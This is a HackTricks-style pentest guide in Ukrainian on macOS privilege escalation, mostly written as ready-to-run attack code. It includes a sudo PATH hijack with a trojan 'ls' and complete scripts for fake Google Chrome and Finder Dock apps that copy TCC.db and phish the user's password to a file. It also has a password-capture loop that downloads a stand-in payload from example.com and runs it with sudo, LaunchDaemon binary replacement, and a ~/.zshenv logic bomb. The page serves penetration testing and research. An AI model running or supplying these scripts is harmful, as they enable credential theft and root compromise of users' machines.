# Підвищення привілеїв у macOS

{{#include ../../banners/hacktricks-training.md}}

## Підвищення привілеїв через TCC

Якщо ви шукаєте інформацію про підвищення привілеїв через TCC, перейдіть сюди:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Підвищення привілеїв у Linux

Багато методів підвищення привілеїв, які працюють у Linux та інших Unix-подібних системах, також застосовні до macOS. Дивіться:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Взаємодія з користувачем

### Перехоплення Sudo

Опис оригінального методу [перехоплення Sudo міститься в статті про підвищення привілеїв у Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Однак у macOS **зберігається** **`PATH`** користувача, коли він виконує **`sudo`**. Це означає, що ще один спосіб здійснити цю атаку — **перехопити інші бінарні файли**, які жертва й надалі запускатиме під час **виконання sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Зверніть увагу, що користувач, який працює в **терміналі**, найімовірніше, матиме **встановлений Homebrew**. Тож можна підмінити бінарні файли в **`/opt/homebrew/bin`**.

### Імітація Dock

За допомогою **social engineering** можна, наприклад, **видати себе за Google Chrome** у Dock і фактично запускати власний скрипт:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Кілька порад:

- Перевірте, чи є в Dock Chrome. Якщо так, **видаліть** цей запис і **додайте** **підроблений** запис **Chrome у ту саму позицію** в масиві Dock.

<details>
<summary>Скрипт для імітації Chrome у Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Деякі поради:

- **Ви не можете прибрати Finder із Dock**, тож якщо збираєтеся додати його в Dock, можна розмістити фальшивий Finder поруч зі справжнім. Для цього потрібно **додати запис фальшивого Finder на початок масиву Dock**.
- Інший варіант — не розміщувати його в Dock, а просто відкрити: «Finder просить керувати Finder» — це не так уже й дивно.
- Ще один варіант **підвищити привілеї до root без запиту пароля**, показавши жахливе діалогове вікно, — змусити Finder справді запросити пароль для виконання привілейованої дії:
  - Попросити Finder скопіювати новий файл **`sudo`** до **`/etc/pam.d`** (у запиті пароля буде зазначено, що «Finder хоче скопіювати sudo»).
  - Попросити Finder скопіювати новий **Authorization Plugin** (можна вибрати ім’я файлу, щоб у запиті пароля було зазначено, що «Finder хоче скопіювати Finder.bundle»).

<details>
<summary>Скрипт для імітації Finder у Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Фішинг через запит пароля + повторне використання sudo

Шкідливе ПЗ часто зловживає взаємодією з користувачем, щоб **захопити пароль, придатний для sudo**, і програмно використовувати його повторно. Типовий сценарій:

1. Визначити користувача, який увійшов у систему, за допомогою `whoami`.
2. **Повторювати запити пароля в циклі**, доки `dscl . -authonly "$user" "$pw"` не поверне успіх.
3. Кешувати облікові дані (наприклад, у `/tmp/.pass`) і виконувати привілейовані дії за допомогою `sudo -S` (передавання пароля через stdin).

Приклад мінімального ланцюжка:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Викрадений пароль можна повторно використати, щоб **очистити карантин Gatekeeper за допомогою `xattr -c`**, скопіювати LaunchDaemons або інші привілейовані файли та запускати додаткові етапи без взаємодії з користувачем.<sup>[[1]](#references)</sup>

## Вектори, специфічні для новіших версій macOS (2023–2026)

### Застарілий `AuthorizationExecuteWithPrivileges` досі можна використовувати

`AuthorizationExecuteWithPrivileges` визнали застарілим у версії 10.7, але він **досі працює в Sonoma/Sequoia**. Багато комерційних програм оновлення запускають `/usr/libexec/security_authtrampoline` із недовіреним шляхом. Якщо цільовий бінарний файл доступний для запису користувачеві, можна підкласти троян і скористатися легітимним запитом на авторизацію:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Поєднайте з **наведеними вище прийомами маскування**, щоб показати правдоподібний діалог пароля.


### Первинний аналіз привілейованих helper / XPC

Багато сучасних сторонніх macOS privesc працюють за однаковою схемою: **root LaunchDaemon** надає **Mach/XPC service** з **`/Library/PrivilegedHelperTools`**, а helper або **не перевіряє клієнта**, або робить це **надто пізно** (PID race), або надає **root method**, що використовує **контрольований користувачем шлях/скрипт**. Саме цей клас помилок стоїть за багатьма нещодавніми проблемами з helper у VPN-клієнтах, ігрових лаунчерах і програмах оновлення.<sup>[[2]](#references)</sup>

Короткий чекліст для первинного аналізу:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Звертайте особливу увагу на helper-и, які:

- продовжують приймати запити **після видалення**, оскільки job залишився завантаженим у `launchd`
- виконують скрипти або читають конфігурацію з **`/Applications/...`** чи інших шляхів, доступних для запису не-root користувачам
- покладаються на перевірку peer за **PID** або лише за **bundle-id**, яку можна обійти через race condition

Докладніше про баги авторизації helper-ів дивіться [на цій сторінці](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Успадкування середовища скриптами PackageKit (CVE-2024-27822)

До виправлення Apple у **Sonoma 14.5**, **Ventura 13.6.7** і **Monterey 12.7.5** інсталяції, ініційовані користувачем через **`Installer.app`** / **`PackageKit.framework`**, могли виконувати **PKG-скрипти від root у середовищі поточного користувача**. Це означає, що пакет із **`#!/bin/zsh`** завантажував би **`~/.zshenv`** атакувальника й запускав його від **root**, коли жертва встановлювала пакет.<sup>[[3]](#references)</sup>

Це особливо цікаво як **logic bomb**: достатньо отримати foothold в обліковому записі користувача й мати доступний для запису файл запуску shell, а потім чекати, поки користувач запустить будь-який вразливий інсталятор на базі **zsh**. Зазвичай це **не** стосується розгортань через **MDM/Munki**, оскільки вони виконуються в середовищі користувача root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Якщо хочете глибше розібратися зі зловживанням інсталяторами, перегляньте також [цю сторінку](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Колізія місця призначення інсталятора через `.localized`

Деякі сторонні інсталятори реєструють root LaunchDaemon, виконуваний файл якого вказано за фіксованим шляхом усередині `/Applications/Target.app`. Якщо зловмисник може спочатку створити цей bundle з **іншим ідентифікатором bundle**, Installer може залишити приманку й розмістити справжню програму за адресою `/Applications/Target.localized/Target.app`. Демон і далі вказуватиме на початковий шлях. Тому контрольований зловмисником виконуваний файл усередині bundle-приманки згодом може запуститися з правами root.<sup>[[8]](#references)</sup>

Важливі передумови:<sup>[[8]](#references)</sup>

1. Зловмисник може створити очікуваний шлях до програми або контролювати його.
2. Пакет не видаляє конфліктний bundle.
3. Привілейоване завдання використовує жорстко заданий шлях усередині цього bundle.
4. Користувач або робочий процес MDM встановлює пакет і реєструє завдання.

Шукайте переміщені bundle, а потім перевірте цілі LaunchDaemon за допомогою циклу переліку в наступному розділі:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Безпечніший інсталятор визначає кінцеве розташування bundle і зберігає привілейовані виконувані файли в місці, власником якого є root, наприклад `/Library/PrivilegedHelperTools`. Він також має перевіряти власника та code signing, перш ніж реєструвати або запускати job.<sup>[[8]](#references)</sup>

### Підміна цілі LaunchDaemon, доступної для запису

Файл plist для LaunchDaemon може належати root, тоді як його `Program` або перший елемент `ProgramArguments` вказує на каталог, доступний користувачеві для запису. Перевіряйте **весь шлях**, а не лише права на виконуваний файл. Якщо батьківський каталог доступний для запису, зловмисник може перейменувати виконуваний файл, що належить root, і створити заміну за тим самим шляхом. Заміна запуститься від імені root під час наступного запуску job. Для цього достатньо перезавантаження або звичайного перезапуску служби. Зловмиснику не потрібен дозвіл на виконання `launchctl bootstrap` у системному домені.<sup>[[7]](#references)</sup>

Спочатку перелічіть кожну ціль і її безпосередній батьківський каталог:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Якщо файл або його батьківський каталог доступний для запису, збережіть оригінальний бінарний файл і замініть шлях на виконуваний payload. Потім дочекайтеся перезапуску вже завантаженого демона.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### Гонка вказівника на облікові дані XNU SMR (CVE-2025-24118)

У вразливому шляху `kauth_cred_proc_update` поле `proc_ro.p_ucred` оновлювалося за допомогою неатомарного API `zalloc_ro_mut`, тоді як читачі SMR завантажували вказівник без блокування. Публічний спосіб запуску використовує спеціально підготовлений бінарний файл setgid. Один потік перемикається між реальним та ефективним ідентифікаторами групи, тоді як інший потік багаторазово викликає системний виклик, наприклад `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Розглядайте це як **race-примітив**, а не готовий експлойт для отримання root. Опублікований PoC демонструє розірваний вказівник на облікові дані. Зазвичай це закінчується панікою ядра. Дослідник відтворив пошкодження лише на Intel і не продемонстрував детермінованого контролю над створеним об’єктом облікових даних. В Apple змінили оновлення на атомарний обмін вказівниками в macOS 15.3.<sup>[[4]](#references)</sup>

### Обхід SIP через Migration Assistant («Migraine», CVE-2023-32369)

Навіть якщо у вас уже є root, SIP усе одно блокує запис у системні розташування. Вразливість **Migraine** зловживає правом Migration Assistant `com.apple.rootless.install.heritable`, щоб запустити дочірній процес, який успадковує обхід SIP і перезаписує захищені шляхи (наприклад, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Ланцюжок:

1. Отримайте root у запущеній системі.
2. Передайте `systemmigrationd` спеціально сформований стан, щоб запустити бінарний файл під контролем зловмисника.
3. Використайте успадковане право, щоб виправити файли, захищені SIP; зміни зберігаються навіть після перезавантаження.

### Контрабанда виразів NSPredicate/XPC (клас помилок CVE-2023-23530/23531)

Кілька демонів Apple приймають об’єкти **NSPredicate** через XPC і перевіряють лише поле `expressionType`, яке контролює зловмисник. Створивши предикат, що виконує довільні селектори, можна досягти **виконання коду в root/system XPC-сервісах** (наприклад, `coreduetd`, `contextstored`). У поєднанні з початковим обходом app sandbox це дає змогу **підвищити привілеї без запитів до користувача**. Шукайте кінцеві точки XPC, які десеріалізують предикати й не мають надійного visitor.<sup>[[6]](#references)</sup>

## TCC — підвищення привілеїв до root

### CVE-2020-9771 — обхід TCC і підвищення привілеїв через mount_apfs

**Будь-який користувач** (навіть без привілеїв) може створити й змонтувати знімок Time Machine із параметром `-o noowners` і **отримати доступ до ВСІХ файлів** цього знімка, обходячи перевірки власника на активному томі. Єдина потрібна привілея — наявність у застосунку (наприклад, `Terminal`) дозволу **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Команди й повне пояснення наведені на сторінці обхідних шляхів TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Конфіденційна інформація

Це може стати в пригоді для підвищення привілеїв:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners — 2025 рік, рік Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: підвищення локальних привілеїв через AWS Client VPN для macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: підвищення привілеїв через macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft «Migraine»: обхід SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Центр передових досліджень Trellix — новий клас помилок підвищення привілеїв у macOS та iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Перехоплення LaunchDaemon: підвищення привілеїв і закріплення через незахищені дозволи папки](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE через каталог .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
